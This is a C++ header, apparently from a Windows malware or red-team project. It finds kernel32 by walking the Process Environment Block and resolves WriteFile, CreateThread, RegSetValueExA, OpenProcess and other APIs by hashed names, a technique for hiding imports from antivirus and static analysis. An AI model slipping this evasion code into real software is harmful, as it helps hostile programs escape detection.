#pragma once

#include <Windows.h>


class Functions {
    DWORD WriteFile_hash = 0x4cc901f2;
    DWORD ReadFile_hash = 0x1957543A;
    DWORD CreateFileA_hash = 0x1f866d80;
    DWORD CreateThread_hash = 0xcc0b468;
    DWORD CloseHandle_hash = 0x27381910;
    DWORD RegSetValueExA_hash = 0x6899629f;
    DWORD OpenProcess_hash = 0x3c4313d1;
    DWORD GetFileSizeEx_hash = 0xe749aed5;
    DWORD GetConsoleWindow_hash = 0x50b16e0e;
    DWORD sleep_hash = 0x44bdc2f5;


    typedef BOOL(WINAPI *CloseHandle_p)(HANDLE);

    typedef void (WINAPI *sleep_p)(DWORD);

    typedef BOOL(WINAPI *ReadFile_p)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);

    typedef BOOL(WINAPI *WriteFile_p)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);

    typedef FARPROC(WINAPI *GetProcAddress_t)(HMODULE, const char *);

    typedef HANDLE(WINAPI *CreateFileA_p)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

    typedef HANDLE(WINAPI *CreateThread_p)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem
                                           LPVOID,
                                           DWORD, LPDWORD);


    typedef LSTATUS(WINAPI *RegSetValueExA_p)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType,
                                              const BYTE *lpData, DWORD cbData);

    typedef HANDLE(WINAPI *OpenProcess_p)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

    typedef BOOL(WINAPI *GetFileSizeEx_p)(HANDLE hFile, PLARGE_INTEGER lpFileSize);

    typedef HWND(WINAPI *GetConsoleWindow_p)(void);



    DWORD getHashFromString(char *);

    PDWORD getFunctionAddressByHash(HMODULE, DWORD);

public:
    HMODULE kernel32 = *(HMODULE *) (
            *(DWORD *) (*(DWORD *) (*(DWORD *) (*(DWORD *) (__readfsdword(0x30) + 0x0C) + 0x14))) + 0x10);
    WriteFile_p WriteFile_Function = (WriteFile_p) getFunctionAddressByHash(kernel32, WriteFile_hash);
    ReadFile_p ReadFile_Function = (ReadFile_p) getFunctionAddressByHash(kernel32, ReadFile_hash);
    CreateThread_p CreateThread_Function = (CreateThread_p) getFunctionAddressByHash(kernel32, CreateThread_hash);
    CloseHandle_p CloseHandle_Function = (CloseHandle_p) getFunctionAddressByHash(kernel32, CloseHandle_hash);
    RegSetValueExA_p RegSetValueExA_Function = (RegSetValueExA_p) getFunctionAddressByHash(kernel32,
                                                                                           RegSetValueExA_hash);
    OpenProcess_p OpenProcess_Function = (OpenProcess_p) getFunctionAddressByHash(kernel32, OpenProcess_hash);
    GetFileSizeEx_p GetFileSizeEx_Function = (GetFileSizeEx_p) getFunctionAddressByHash(kernel32, GetFileSizeEx_hash);
    CreateFileA_p CreateFileA_Function = (CreateFileA_p) getFunctionAddressByHash(kernel32, CreateFileA_hash);
    GetConsoleWindow_p GetConsoleWindow_Function = (GetConsoleWindow_p) getFunctionAddressByHash(kernel32 , GetConsoleWindow_hash);
    sleep_p Sleep_Function = (sleep_p) getFunctionAddressByHash(kernel32, sleep_hash);
};

